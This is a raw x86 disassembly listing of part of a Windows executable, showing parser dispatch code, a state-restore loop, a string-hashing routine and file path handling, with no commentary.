  40a931:	mov    BYTE PTR ds:0x414b12,ah
  40a937:	jmp    0x40a967
  40a939:	cmp    ah,0x2
  40a93c:	jne    0x40a956
  40a93e:	test   cl,cl
  40a940:	jne    0x40ac24
  40a946:	mov    BYTE PTR ds:0x414b16,0x1
  40a94d:	mov    BYTE PTR ds:0x414b13,0x1
  40a954:	jmp    0x40a967
  40a956:	cmp    ah,0x3
  40a959:	jne    0x40ac24
  40a95f:	test   cl,cl
  40a961:	jne    0x40ac24
  40a967:	sub    esp,0x8
  40a96a:	lea    ecx,[ebp-0x4]
  40a96d:	call   0x40a790
  40a972:	add    esp,0x8
  40a975:	mov    edx,DWORD PTR [ebp-0x4]
  40a978:	mov    esi,DWORD PTR ds:0x41f360
  40a97e:	jmp    0x40ac24
  40a983:	push   ecx
  40a984:	lea    ecx,[ebp-0x4]
  40a987:	call   0x40a6e0
  40a98c:	mov    edx,DWORD PTR [ebp-0x4]
  40a98f:	mov    esi,DWORD PTR ds:0x41f360
  40a995:	add    esp,0x4
  40a998:	jmp    0x40ac24
  40a99d:	movzx  eax,WORD PTR [edx]
  40a9a0:	add    edx,0x2
  40a9a3:	add    WORD PTR ds:0x40e8d8,ax
  40a9aa:	mov    ebx,0x2
  40a9af:	jmp    0x40ac24
  40a9b4:	mov    ax,WORD PTR [edx]
  40a9b7:	add    edx,0x2
  40a9ba:	mov    ds:0x40e8d8,ax
  40a9c0:	test   ax,ax
  40a9c3:	je     0x40ac24
  40a9c9:	mov    ecx,0xffff
  40a9ce:	add    ax,cx
  40a9d1:	mov    ds:0x40e8d8,ax
  40a9d7:	jmp    0x40ac24
  40a9dc:	mov    eax,DWORD PTR [edx]
  40a9de:	add    edx,0x4
  40a9e1:	cmp    eax,0xffff
  40a9e6:	jbe    0x40a9ed
  40a9e8:	mov    eax,0xffff
  40a9ed:	mov    ds:0x40e8d8,ax
  40a9f3:	test   ax,ax
  40a9f6:	je     0x40ac24
  40a9fc:	dec    eax
  40a9fd:	mov    ds:0x40e8d8,ax
  40aa03:	jmp    0x40ac24
  40aa08:	mov    DWORD PTR ds:0x40e8c8,0x0
  40aa12:	test   cl,0x40
  40aa15:	jne    0x40aa48
  40aa17:	movzx  ecx,WORD PTR [edx]
  40aa1a:	mov    DWORD PTR ds:0x40e8c8,ecx
  40aa20:	mov    al,BYTE PTR [edx+0x2]
  40aa23:	add    edx,0x3
  40aa26:	mov    ds:0x40e8cc,al
  40aa2b:	test   ecx,0x8000
  40aa31:	je     0x40ac24
  40aa37:	or     ecx,0xffff0000
  40aa3d:	mov    DWORD PTR ds:0x40e8c8,ecx
  40aa43:	jmp    0x40ac24
  40aa48:	mov    al,BYTE PTR [edx]
  40aa4a:	mov    ds:0x40e8c8,al
  40aa4f:	mov    al,BYTE PTR [edx+0x1]
  40aa52:	mov    ds:0x40e8c9,al
  40aa57:	mov    al,BYTE PTR [edx+0x2]
  40aa5a:	mov    ds:0x40e8ca,al
  40aa5f:	mov    al,BYTE PTR [edx+0x3]
  40aa62:	mov    ds:0x40e8cc,al
  40aa67:	add    edx,0x4
  40aa6a:	jmp    0x40ac0e
  40aa6f:	test   cl,0x40
  40aa72:	jne    0x40ab0c
  40aa78:	cmp    BYTE PTR ds:0x414b12,0x0
  40aa7f:	jne    0x40aa97
  40aa81:	mov    al,BYTE PTR [edx]
  40aa83:	mov    ds:0x40e8cc,al
  40aa88:	mov    ax,WORD PTR [edx+0x1]
  40aa8c:	mov    ds:0x40e8d0,ax
  40aa92:	add    edx,0x3
  40aa95:	jmp    0x40aab8
  40aa97:	mov    cx,WORD PTR [edx]
  40aa9a:	mov    ax,cx
  40aa9d:	shr    ax,0xb
  40aaa1:	mov    ds:0x40e8cc,al
  40aaa6:	mov    eax,0x7ff
  40aaab:	add    edx,0x2
  40aaae:	and    cx,ax
  40aab1:	mov    WORD PTR ds:0x40e8d0,cx
  40aab8:	mov    DWORD PTR ds:0x40e8c8,0x0
  40aac2:	movzx  eax,WORD PTR [edx]
  40aac5:	add    edx,0x2
  40aac8:	cmp    BYTE PTR ds:0x40e8d3,0x0
  40aacf:	mov    ds:0x40e8c8,eax
  40aad4:	mov    DWORD PTR [ebp-0x4],edx
  40aad7:	je     0x40aadd
  40aad9:	inc    edx
  40aada:	mov    DWORD PTR [ebp-0x4],edx
  40aadd:	push   ecx
  40aade:	lea    ecx,[ebp-0x4]
  40aae1:	call   0x40a6e0
  40aae6:	mov    eax,ds:0x40e8c8
  40aaeb:	add    esp,0x4
  40aaee:	test   eax,0x8000
  40aaf3:	je     0x40a975
  40aaf9:	mov    edx,DWORD PTR [ebp-0x4]
  40aafc:	mov    esi,DWORD PTR ds:0x41f360
  40ab02:	or     eax,0xffff0000
  40ab07:	jmp    0x40ac1f
  40ab0c:	mov    al,BYTE PTR [edx]
  40ab0e:	mov    ds:0x40e8cc,al
  40ab13:	mov    ax,WORD PTR [edx+0x1]
  40ab17:	mov    DWORD PTR ds:0x40e8c8,0x0
  40ab21:	mov    ds:0x40e8d0,ax
  40ab27:	mov    al,BYTE PTR [edx+0x3]
  40ab2a:	mov    ds:0x40e8c8,al
  40ab2f:	mov    al,BYTE PTR [edx+0x4]
  40ab32:	mov    ds:0x40e8c9,al
  40ab37:	mov    al,BYTE PTR [edx+0x5]
  40ab3a:	add    edx,0x6
  40ab3d:	cmp    BYTE PTR ds:0x40e8d3,0x0
  40ab44:	mov    ds:0x40e8ca,al
  40ab49:	mov    DWORD PTR [ebp-0x4],edx
  40ab4c:	je     0x40ab52
  40ab4e:	inc    edx
  40ab4f:	mov    DWORD PTR [ebp-0x4],edx
  40ab52:	push   ecx
  40ab53:	lea    ecx,[ebp-0x4]
  40ab56:	call   0x40a6e0
  40ab5b:	mov    eax,ds:0x40e8c8
  40ab60:	add    esp,0x4
  40ab63:	test   eax,0x800000
  40ab68:	je     0x40a975
  40ab6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ab71:	mov    esi,DWORD PTR ds:0x41f360
  40ab77:	jmp    0x40ac1a
  40ab7c:	mov    DWORD PTR ds:0x40e8c8,0x0
  40ab86:	test   cl,0x40
  40ab89:	jne    0x40aba8
  40ab8b:	movzx  eax,WORD PTR [edx]
  40ab8e:	mov    ds:0x40e8c8,eax
  40ab93:	add    edx,0x2
  40ab96:	test   eax,0x8000
  40ab9b:	je     0x40ac24
  40aba1:	or     eax,0xffff0000
  40aba6:	jmp    0x40ac1f
  40aba8:	mov    al,BYTE PTR [edx]
  40abaa:	mov    ds:0x40e8c8,al
  40abaf:	mov    al,BYTE PTR [edx+0x1]
  40abb2:	mov    ds:0x40e8c9,al
  40abb7:	mov    al,BYTE PTR [edx+0x2]
  40abba:	mov    ds:0x40e8ca,al
  40abbf:	add    edx,0x3
  40abc2:	jmp    0x40ac0e
  40abc4:	mov    DWORD PTR ds:0x40e8c8,0x0
  40abce:	test   cl,0x40
  40abd1:	jne    0x40abea
  40abd3:	movzx  eax,WORD PTR [edx]
  40abd6:	add    edx,0x2
  40abd9:	cmp    BYTE PTR ds:0x40e8d3,0x0
  40abe0:	mov    ds:0x40e8c8,eax
  40abe5:	je     0x40ab96
  40abe7:	inc    edx
  40abe8:	jmp    0x40ab96
  40abea:	mov    al,BYTE PTR [edx]
  40abec:	mov    ds:0x40e8c8,al
  40abf1:	mov    al,BYTE PTR [edx+0x1]
  40abf4:	mov    ds:0x40e8c9,al
  40abf9:	mov    al,BYTE PTR [edx+0x2]
  40abfc:	add    edx,0x3
  40abff:	cmp    BYTE PTR ds:0x40e8d3,0x0
  40ac06:	mov    ds:0x40e8ca,al
  40ac0b:	je     0x40ac0e
  40ac0d:	inc    edx
  40ac0e:	mov    eax,ds:0x40e8c8
  40ac13:	test   eax,0x800000
  40ac18:	je     0x40ac24
  40ac1a:	or     eax,0xff000000
  40ac1f:	mov    ds:0x40e8c8,eax
  40ac24:	mov    eax,ds:0x41735c
  40ac29:	sub    eax,edx
  40ac2b:	add    esi,eax
  40ac2d:	mov    DWORD PTR ds:0x41f360,esi
  40ac33:	mov    DWORD PTR ds:0x41735c,edx
  40ac39:	js     0x40ac5b
  40ac3b:	pop    esi
  40ac3c:	mov    BYTE PTR ds:0x40e8cd,bl
  40ac42:	mov    al,bl
  40ac44:	pop    ebx
  40ac45:	mov    esp,ebp
  40ac47:	pop    ebp
  40ac48:	ret    
  40ac49:	mov    edx,DWORD PTR ds:0x40e8dc
  40ac4f:	push   0x0
  40ac51:	mov    ecx,0x5e6
  40ac56:	call   0x407010
  40ac5b:	mov    edx,DWORD PTR ds:0x40e8dc
  40ac61:	push   0x0
  40ac63:	mov    ecx,0x5e6
  40ac68:	call   0x407010
  40ac6d:	lea    ecx,[ecx+0x0]
  40ac70:	into   
  40ac71:	test   al,0x40
  40ac73:	add    BYTE PTR [ebx-0x4bffbf57],al
  40ac79:	test   eax,0xaa6f0040
  40ac7e:	inc    eax
  40ac7f:	add    ah,al
  40ac81:	stos   DWORD PTR es:[edi],eax
  40ac82:	inc    eax
  40ac83:	add    BYTE PTR [ebx+ebp*4+0x40],bh
  40ac87:	add    BYTE PTR [eax],cl
  40ac89:	stos   BYTE PTR es:[edi],al
  40ac8a:	inc    eax
  40ac8b:	add    BYTE PTR [ebp-0x24ffbf57],bl
  40ac91:	test   al,0x40
  40ac93:	add    ah,bl
  40ac95:	test   eax,0xac240040
  40ac9a:	inc    eax
  40ac9b:	add    BYTE PTR [eax],al
  40ac9d:	add    DWORD PTR [edx],eax
  40ac9f:	add    eax,DWORD PTR [esp+eax*1]
  40aca2:	or     cl,BYTE PTR [edx]
  40aca4:	or     cl,BYTE PTR [edx]
  40aca6:	or     al,BYTE PTR ds:0x10a0506
  40acac:	or     cl,BYTE PTR [edx]
  40acae:	or     cl,BYTE PTR [edx]
  40acb0:	or     al,BYTE PTR [edi]
  40acb2:	or     BYTE PTR [edx],cl
  40acb4:	or     cl,BYTE PTR [edx]
  40acb6:	or     esp,ecx
  40acb8:	int3   
  40acb9:	int3   
  40acba:	int3   
  40acbb:	int3   
  40acbc:	int3   
  40acbd:	int3   
  40acbe:	int3   
  40acbf:	int3   
  40acc0:	push   esi
  40acc1:	mov    esi,DWORD PTR ds:0x41f364
  40acc7:	test   esi,esi
  40acc9:	je     0x40ad65
  40accf:	push   ebx
  40acd0:	mov    ebx,DWORD PTR ds:0x42441c
  40acd6:	push   edi
  40acd7:	push   DWORD PTR ds:0x40eae8
  40acdd:	call   DWORD PTR ds:0x4243c0
  40ace3:	push   DWORD PTR ds:0x40e8dc
  40ace9:	mov    edi,DWORD PTR ds:0x41f364
  40acef:	call   ebx
  40acf1:	mov    eax,DWORD PTR [edi+0x10]
  40acf4:	mov    ds:0x40e8dc,eax
  40acf9:	mov    eax,DWORD PTR [edi+0x4]
  40acfc:	push   eax
  40acfd:	push   DWORD PTR [edi+0x8]
  40ad00:	mov    BYTE PTR ds:0x40eaf2,0x1
  40ad07:	push   0x417360
  40ad0c:	mov    ds:0x41f360,eax
  40ad11:	call   0x40db6c
  40ad16:	push   DWORD PTR [edi+0xc]
  40ad19:	push   0x104
  40ad1e:	push   0x40e8e0
  40ad23:	call   DWORD PTR ds:0x4244b8
  40ad29:	mov    eax,DWORD PTR [edi+0x14]
  40ad2c:	mov    ds:0x40eae8,eax
  40ad31:	mov    al,BYTE PTR [edi+0x18]
  40ad34:	mov    esi,DWORD PTR [edi]
  40ad36:	push   DWORD PTR [edi+0x8]
  40ad39:	mov    DWORD PTR ds:0x41735c,0x417360
  40ad43:	mov    ds:0x40eaf3,al
  40ad48:	mov    DWORD PTR ds:0x41f364,esi
  40ad4e:	call   ebx
  40ad50:	push   DWORD PTR [edi+0xc]
  40ad53:	call   ebx
  40ad55:	push   edi
  40ad56:	call   ebx
  40ad58:	add    esp,0x2c
  40ad5b:	test   esi,esi
  40ad5d:	jne    0x40acd7
  40ad63:	pop    edi
  40ad64:	pop    ebx
  40ad65:	mov    BYTE PTR ds:0x40eaf3,0x0
  40ad6c:	mov    BYTE PTR ds:0x40eaf2,0x0
  40ad73:	mov    DWORD PTR ds:0x41f360,0x0
  40ad7d:	pop    esi
  40ad7e:	ret    
  40ad7f:	int3   
  40ad80:	push   ebp
  40ad81:	mov    ebp,esp
  40ad83:	sub    esp,0xc
  40ad86:	movzx  eax,BYTE PTR ds:0x40e8cd
  40ad8d:	push   ebx
  40ad8e:	add    eax,0xfffffffc
  40ad91:	push   esi
  40ad92:	push   edi
  40ad93:	mov    DWORD PTR [ebp-0xc],ecx
  40ad96:	cmp    eax,0x9
  40ad99:	ja     0x40adc7
  40ad9b:	movzx  eax,BYTE PTR [eax+0x40af84]
  40ada2:	jmp    DWORD PTR [eax*4+0x40af74]
  40ada9:	mov    eax,0x4
  40adae:	jmp    0x40adc9
  40adb0:	mov    eax,0x3
  40adb5:	jmp    0x40adc9
  40adb7:	xor    eax,eax
  40adb9:	cmp    BYTE PTR ds:0x40e8d3,al
  40adbf:	setne  al
  40adc2:	add    eax,0x3
  40adc5:	jmp    0x40adc9
  40adc7:	xor    eax,eax
  40adc9:	mov    ebx,DWORD PTR ds:0x41735c
  40adcf:	mov    esi,DWORD PTR ds:0x41f360
  40add5:	sub    ebx,eax
  40add7:	add    esi,eax
  40add9:	push   0x1
  40addb:	push   0x19
  40addd:	mov    DWORD PTR ds:0x41735c,ebx
  40ade3:	mov    DWORD PTR ds:0x41f360,esi
  40ade9:	call   DWORD PTR ds:0x424424
  40adef:	mov    edi,eax
  40adf1:	add    esp,0x8
  40adf4:	test   edi,edi
  40adf6:	je     0x40af18
  40adfc:	push   0x1
  40adfe:	push   esi
  40adff:	mov    DWORD PTR [edi+0x4],esi
  40ae02:	call   DWORD PTR ds:0x424424
  40ae08:	add    esp,0x8
  40ae0b:	mov    DWORD PTR [ebp-0x4],eax
  40ae0e:	test   eax,eax
  40ae10:	je     0x40af29
  40ae16:	mov    ecx,0x40e8e0
  40ae1b:	mov    DWORD PTR [edi+0x8],eax
  40ae1e:	lea    edx,[ecx+0x2]
  40ae21:	mov    ax,WORD PTR [ecx]
  40ae24:	add    ecx,0x2
  40ae27:	test   ax,ax
  40ae2a:	jne    0x40ae21
  40ae2c:	sub    ecx,edx
  40ae2e:	sar    ecx,1
  40ae30:	push   0x1
  40ae32:	lea    eax,[ecx+0x1]
  40ae35:	mov    DWORD PTR [ebp-0x8],eax
  40ae38:	add    eax,eax
  40ae3a:	push   eax
  40ae3b:	call   DWORD PTR ds:0x424424
  40ae41:	add    esp,0x8
  40ae44:	test   eax,eax
  40ae46:	je     0x40af3a
  40ae4c:	mov    DWORD PTR [edi+0xc],eax
  40ae4f:	mov    eax,ds:0x40e8dc
  40ae54:	mov    DWORD PTR [edi+0x10],eax
  40ae57:	mov    eax,ds:0x41f364
  40ae5c:	mov    DWORD PTR [edi],eax
  40ae5e:	mov    eax,ds:0x40eae8
  40ae63:	push   esi
  40ae64:	mov    DWORD PTR [edi+0x14],eax
  40ae67:	mov    al,ds:0x40eaf3
  40ae6c:	push   ebx
  40ae6d:	push   DWORD PTR [ebp-0x4]
  40ae70:	mov    BYTE PTR [edi+0x18],al
  40ae73:	mov    DWORD PTR ds:0x41f364,edi
  40ae79:	call   0x40db6c
  40ae7e:	add    esp,0xc
  40ae81:	push   0x40e8e0
  40ae86:	push   DWORD PTR [ebp-0x8]
  40ae89:	push   DWORD PTR [edi+0xc]
  40ae8c:	call   DWORD PTR ds:0x4244b8
  40ae92:	mov    ebx,DWORD PTR [ebp-0xc]
  40ae95:	mov    ecx,ebx
  40ae97:	add    esp,0xc
  40ae9a:	lea    edx,[ecx+0x2]
  40ae9d:	lea    ecx,[ecx+0x0]
  40aea0:	mov    ax,WORD PTR [ecx]
  40aea3:	add    ecx,0x2
  40aea6:	test   ax,ax
  40aea9:	jne    0x40aea0
  40aeab:	sub    ecx,edx
  40aead:	sar    ecx,1
  40aeaf:	push   0x1
  40aeb1:	lea    edi,[ecx+0x1]
  40aeb4:	lea    eax,[edi+edi*1]
  40aeb7:	push   eax
  40aeb8:	call   DWORD PTR ds:0x424424
  40aebe:	mov    esi,eax
  40aec0:	add    esp,0x8
  40aec3:	test   esi,esi
  40aec5:	je     0x40af4b
  40aecb:	push   ebx
  40aecc:	push   edi
  40aecd:	push   esi
  40aece:	call   DWORD PTR ds:0x4244b8
  40aed4:	add    esp,0xc
  40aed7:	mov    DWORD PTR ds:0x40e8dc,esi
  40aedd:	push   0x0
  40aedf:	push   0x40
  40aee1:	push   0x8000
  40aee6:	push   esi
  40aee7:	push   0x40eae8
  40aeec:	mov    BYTE PTR ds:0x40eaf3,0x0
  40aef3:	mov    BYTE PTR ds:0x40eaf2,0x0
  40aefa:	mov    DWORD PTR ds:0x41f360,0x0
  40af04:	call   DWORD PTR ds:0x4243bc
  40af0a:	add    esp,0x14
  40af0d:	test   eax,eax
  40af0f:	jne    0x40af5c
  40af11:	pop    edi
  40af12:	pop    esi
  40af13:	pop    ebx
  40af14:	mov    esp,ebp
  40af16:	pop    ebp
  40af17:	ret    
  40af18:	push   0x0
  40af1a:	mov    edx,0x4010c0
  40af1f:	mov    ecx,0x5e5
  40af24:	call   0x407010
  40af29:	push   0x0
  40af2b:	mov    edx,0x4010c0
  40af30:	mov    ecx,0x5e5
  40af35:	call   0x407010
  40af3a:	push   0x0
  40af3c:	mov    edx,0x4010c0
  40af41:	mov    ecx,0x5e5
  40af46:	call   0x407010
  40af4b:	push   0x0
  40af4d:	mov    edx,0x4010c0
  40af52:	mov    ecx,0x5e5
  40af57:	call   0x407010
  40af5c:	call   DWORD PTR ds:0x4243b8
  40af62:	push   DWORD PTR [eax]
  40af64:	mov    edx,DWORD PTR ds:0x40e8dc
  40af6a:	mov    ecx,0x5e2
  40af6f:	call   0x407010
  40af74:	mov    bh,0xad
  40af76:	inc    eax
  40af77:	add    BYTE PTR [eax-0x56ffbf53],dh
  40af7d:	lods   eax,DWORD PTR ds:[esi]
  40af7e:	inc    eax
  40af7f:	add    bh,al
  40af81:	lods   eax,DWORD PTR ds:[esi]
  40af82:	inc    eax
  40af83:	add    BYTE PTR [eax],al
  40af85:	add    BYTE PTR [ebx],al
  40af87:	add    eax,DWORD PTR [ebx]
  40af89:	add    eax,DWORD PTR [ebx]
  40af8b:	add    DWORD PTR [edx],eax
  40af8d:	add    esp,ecx
  40af8f:	int3   
  40af90:	cmp    DWORD PTR ds:0x41f364,0x0
  40af97:	je     0x40b02a
  40af9d:	push   esi
  40af9e:	push   edi
  40af9f:	push   DWORD PTR ds:0x40eae8
  40afa5:	call   DWORD PTR ds:0x4243c0
  40afab:	push   DWORD PTR ds:0x40e8dc
  40afb1:	mov    esi,DWORD PTR ds:0x42441c
  40afb7:	mov    edi,DWORD PTR ds:0x41f364
  40afbd:	call   esi
  40afbf:	mov    eax,DWORD PTR [edi+0x10]
  40afc2:	mov    ds:0x40e8dc,eax
  40afc7:	mov    eax,DWORD PTR [edi+0x4]
  40afca:	push   eax
  40afcb:	push   DWORD PTR [edi+0x8]
  40afce:	mov    BYTE PTR ds:0x40eaf2,0x1
  40afd5:	push   0x417360
  40afda:	mov    ds:0x41f360,eax
  40afdf:	call   0x40db6c
  40afe4:	push   DWORD PTR [edi+0xc]
  40afe7:	push   0x104
  40afec:	push   0x40e8e0
  40aff1:	call   DWORD PTR ds:0x4244b8
  40aff7:	mov    eax,DWORD PTR [edi+0x14]
  40affa:	mov    ds:0x40eae8,eax
  40afff:	mov    al,BYTE PTR [edi+0x18]
  40b002:	push   DWORD PTR [edi+0x8]
  40b005:	mov    ds:0x40eaf3,al
  40b00a:	mov    eax,DWORD PTR [edi]
  40b00c:	mov    DWORD PTR ds:0x41735c,0x417360
  40b016:	mov    ds:0x41f364,eax
  40b01b:	call   esi
  40b01d:	push   DWORD PTR [edi+0xc]
  40b020:	call   esi
  40b022:	push   edi
  40b023:	call   esi
  40b025:	add    esp,0x2c
  40b028:	pop    edi
  40b029:	pop    esi
  40b02a:	ret    
  40b02b:	int3   
  40b02c:	int3   
  40b02d:	int3   
  40b02e:	int3   
  40b02f:	int3   
  40b030:	push   ebp
  40b031:	mov    ebp,esp
  40b033:	push   esi
  40b034:	mov    esi,DWORD PTR [ebp+0x8]
  40b037:	test   esi,esi
  40b039:	js     0x40b0a5
  40b03b:	mov    edx,DWORD PTR ds:0x40e064
  40b041:	mov    ecx,DWORD PTR ds:0x40e068
  40b047:	mov    eax,edx
  40b049:	sub    eax,ecx
  40b04b:	add    eax,DWORD PTR ds:0x40e06c
  40b051:	cmp    esi,eax
  40b053:	jle    0x40b070
  40b055:	push   esi
  40b056:	mov    ecx,0x40e064
  40b05b:	call   0x406ea0
  40b060:	test   eax,eax
  40b062:	je     0x40b0a5
  40b064:	mov    ecx,DWORD PTR ds:0x40e068
  40b06a:	mov    edx,DWORD PTR ds:0x40e064
  40b070:	mov    eax,DWORD PTR [ebp+0xc]
  40b073:	test   eax,eax
  40b075:	je     0x40b079
  40b077:	mov    DWORD PTR [eax],ecx
  40b079:	lea    eax,[ecx+esi*1]
  40b07c:	test   edx,edx
  40b07e:	jne    0x40b096
  40b080:	mov    DWORD PTR ds:0x40e068,edx
  40b086:	mov    DWORD PTR ds:0x40e064,edx
  40b08c:	mov    eax,0x1
  40b091:	pop    esi
  40b092:	pop    ebp
  40b093:	ret    0x8
  40b096:	mov    ds:0x40e068,eax
  40b09b:	mov    eax,0x1
  40b0a0:	pop    esi
  40b0a1:	pop    ebp
  40b0a2:	ret    0x8
  40b0a5:	xor    eax,eax
  40b0a7:	pop    esi
  40b0a8:	pop    ebp
  40b0a9:	ret    0x8
  40b0ac:	int3   
  40b0ad:	int3   
  40b0ae:	int3   
  40b0af:	int3   
  40b0b0:	push   ebp
  40b0b1:	mov    ebp,esp
  40b0b3:	sub    esp,0x41c
  40b0b9:	mov    eax,ds:0x40e018
  40b0be:	xor    eax,ebp
  40b0c0:	mov    DWORD PTR [ebp-0x4],eax
  40b0c3:	push   ebx
  40b0c4:	push   esi
  40b0c5:	push   edi
  40b0c6:	lea    edx,[ebp-0x418]
  40b0cc:	mov    DWORD PTR [ebp-0x418],0x401bfc
  40b0d6:	mov    DWORD PTR [ebp-0x410],0x0
  40b0e0:	mov    DWORD PTR [ebp-0x414],0x0
  40b0ea:	call   0x40c800
  40b0ef:	test   eax,eax
  40b0f1:	je     0x40b13c
  40b0f3:	mov    ecx,eax
  40b0f5:	call   0x40b150
  40b0fa:	mov    esi,DWORD PTR [ebp-0x410]
  40b100:	movzx  ebx,ax
  40b103:	mov    DWORD PTR [ebp-0x418],0x401bfc
  40b10d:	test   esi,esi
  40b10f:	je     0x40b128
  40b111:	mov    edi,DWORD PTR ds:0x4242c0
  40b117:	push   esi
  40b118:	mov    esi,DWORD PTR [esi]
  40b11a:	push   0x0
  40b11c:	push   DWORD PTR ds:0x40e648
  40b122:	call   edi
  40b124:	test   esi,esi
  40b126:	jne    0x40b117
  40b128:	mov    ecx,DWORD PTR [ebp-0x4]
  40b12b:	pop    edi
  40b12c:	pop    esi
  40b12d:	mov    ax,bx
  40b130:	xor    ecx,ebp
  40b132:	pop    ebx
  40b133:	call   0x40d492
  40b138:	mov    esp,ebp
  40b13a:	pop    ebp
  40b13b:	ret    
  40b13c:	push   0x0
  40b13e:	mov    edx,0x4010c0
  40b143:	mov    ecx,0x5e5
  40b148:	call   0x407010
  40b14d:	int3   
  40b14e:	int3   
  40b14f:	int3   
  40b150:	push   esi
  40b151:	mov    edx,ecx
  40b153:	push   edi
  40b154:	xor    esi,esi
  40b156:	lea    edi,[edx+0x1]
  40b159:	lea    esp,[esp+0x0]
  40b160:	mov    al,BYTE PTR [edx]
  40b162:	inc    edx
  40b163:	test   al,al
  40b165:	jne    0x40b160
  40b167:	sub    edx,edi
  40b169:	cmp    edx,0x3f
  40b16c:	jbe    0x40b173
  40b16e:	mov    edx,0x3f
  40b173:	test   dl,0x1
  40b176:	je     0x40b17c
  40b178:	movsx  esi,BYTE PTR [ecx]
  40b17b:	inc    ecx
  40b17c:	test   dl,0x2
  40b17f:	je     0x40b189
  40b181:	movzx  eax,WORD PTR [ecx]
  40b184:	xor    esi,eax
  40b186:	add    ecx,0x2
  40b189:	test   dl,0x4
  40b18c:	je     0x40b193
  40b18e:	xor    esi,DWORD PTR [ecx]
  40b190:	add    ecx,0x4
  40b193:	test   dl,0x8
  40b196:	je     0x40b1a2
  40b198:	mov    eax,DWORD PTR [ecx+0x4]
  40b19b:	xor    eax,DWORD PTR [ecx]
  40b19d:	xor    esi,eax
  40b19f:	add    ecx,0x8
  40b1a2:	test   dl,0x10
  40b1a5:	je     0x40b1b7
  40b1a7:	mov    eax,DWORD PTR [ecx+0xc]
  40b1aa:	xor    eax,DWORD PTR [ecx+0x8]
  40b1ad:	xor    eax,DWORD PTR [ecx+0x4]
  40b1b0:	xor    eax,DWORD PTR [ecx]
  40b1b2:	xor    esi,eax
  40b1b4:	add    ecx,0x10
  40b1b7:	test   dl,0x20
  40b1ba:	je     0x40b1d5
  40b1bc:	mov    eax,DWORD PTR [ecx+0x1c]
  40b1bf:	xor    eax,DWORD PTR [ecx+0x18]
  40b1c2:	xor    eax,DWORD PTR [ecx+0x14]
  40b1c5:	xor    eax,DWORD PTR [ecx+0x10]
  40b1c8:	xor    eax,DWORD PTR [ecx+0xc]
  40b1cb:	xor    eax,DWORD PTR [ecx+0x8]
  40b1ce:	xor    eax,DWORD PTR [ecx+0x4]
  40b1d1:	xor    eax,DWORD PTR [ecx]
  40b1d3:	xor    esi,eax
  40b1d5:	or     esi,0x20202020
  40b1db:	mov    eax,esi
  40b1dd:	shr    eax,0xb
  40b1e0:	xor    esi,eax
  40b1e2:	mov    eax,esi
  40b1e4:	shr    eax,0x10
  40b1e7:	xor    eax,esi
  40b1e9:	pop    edi
  40b1ea:	and    eax,0x3fff
  40b1ef:	pop    esi
  40b1f0:	ret    
  40b1f1:	int3   
  40b1f2:	int3   
  40b1f3:	int3   
  40b1f4:	int3   
  40b1f5:	int3   
  40b1f6:	int3   
  40b1f7:	int3   
  40b1f8:	int3   
  40b1f9:	int3   
  40b1fa:	int3   
  40b1fb:	int3   
  40b1fc:	int3   
  40b1fd:	int3   
  40b1fe:	int3   
  40b1ff:	int3   
  40b200:	push   ebp
  40b201:	mov    ebp,esp
  40b203:	push   ecx
  40b204:	mov    ecx,DWORD PTR ds:0x40e430
  40b20a:	lea    edx,[ebp-0x4]
  40b20d:	mov    eax,DWORD PTR [ecx]
  40b20f:	push   edx
  40b210:	push   DWORD PTR [ebp+0x8]
  40b213:	call   DWORD PTR [eax+0x38]
  40b216:	test   eax,eax
  40b218:	je     0x40b25f
  40b21a:	push   esi
  40b21b:	mov    esi,DWORD PTR [ebp-0x4]
  40b21e:	push   0x5c
  40b220:	push   esi
  40b221:	call   DWORD PTR ds:0x4243f8
  40b227:	add    esp,0x8
  40b22a:	test   eax,eax
  40b22c:	je     0x40b23d
  40b22e:	lea    esi,[eax+0x2]
  40b231:	mov    ecx,esi
  40b233:	call   0x40b0b0
  40b238:	pop    esi
  40b239:	mov    esp,ebp
  40b23b:	pop    ebp
  40b23c:	ret    
  40b23d:	push   0x3a
  40b23f:	push   esi
  40b240:	call   DWORD PTR ds:0x4243f4
  40b246:	lea    edx,[esi+0x2]
  40b249:	add    esp,0x8
  40b24c:	cmp    eax,edx
  40b24e:	jne    0x40b253
  40b250:	add    esi,0x4
  40b253:	mov    ecx,esi
  40b255:	call   0x40b0b0
  40b25a:	pop    esi
  40b25b:	mov    esp,ebp
  40b25d:	pop    ebp
  40b25e:	ret    
  40b25f:	push   0x0
  40b261:	mov    edx,0x4010c0
  40b266:	mov    ecx,0x5e5
  40b26b:	call   0x407010
  40b270:	int3   
  40b271:	int3   
  40b272:	int3   
  40b273:	int3   
  40b274:	int3   
  40b275:	int3   
  40b276:	int3   
  40b277:	int3   
  40b278:	int3   
  40b279:	int3   
  40b27a:	int3   
  40b27b:	int3   
  40b27c:	int3   
  40b27d:	int3   
  40b27e:	int3   
  40b27f:	int3   
  40b280:	push   ebp
  40b281:	mov    ebp,esp
  40b283:	sub    esp,0x24
  40b286:	mov    ecx,DWORD PTR ds:0x40e8d4
  40b28c:	push   ebx
  40b28d:	push   esi
  40b28e:	push   edi
  40b28f:	mov    edx,0x40e8e0
  40b294:	mov    DWORD PTR [ebp-0x1c],0x0
  40b29b:	mov    DWORD PTR [ebp-0x24],0x0
  40b2a2:	mov    DWORD PTR [ebp-0x18],0x0
  40b2a9:	mov    DWORD PTR [ebp-0x14],0x0
  40b2b0:	mov    WORD PTR [ebp-0x10],0x101
  40b2b6:	call   0x409e70
  40b2bb:	mov    edi,eax
  40b2bd:	mov    edx,edi
  40b2bf:	lea    eax,[edx+0x2]
  40b2c2:	mov    cx,WORD PTR [edx]
  40b2c5:	add    edx,0x2
  40b2c8:	test   cx,cx
  40b2cb:	jne    0x40b2c2
  40b2cd:	sub    edx,eax
  40b2cf:	sar    edx,1
  40b2d1:	mov    DWORD PTR [ebp-0x4],0x0
  40b2d8:	lea    esi,[edx+0x1]
  40b2db:	mov    eax,0x400
  40b2e0:	cmp    esi,0x400
  40b2e6:	jb     0x40b2ea
  40b2e8:	mov    eax,esi
  40b2ea:	lea    ecx,[ebp-0x4]
  40b2ed:	push   ecx
  40b2ee:	add    eax,eax
  40b2f0:	push   eax
  40b2f1:	lea    ecx,[ebp-0x24]
  40b2f4:	mov    DWORD PTR [ebp-0x20],0x0
  40b2fb:	call   0x406f80
  40b300:	test   eax,eax
  40b302:	je     0x40b42e
  40b308:	mov    ebx,DWORD PTR [ebp-0x4]
  40b30b:	push   edi
  40b30c:	push   esi
  40b30d:	push   ebx
  40b30e:	call   DWORD PTR ds:0x4244b8
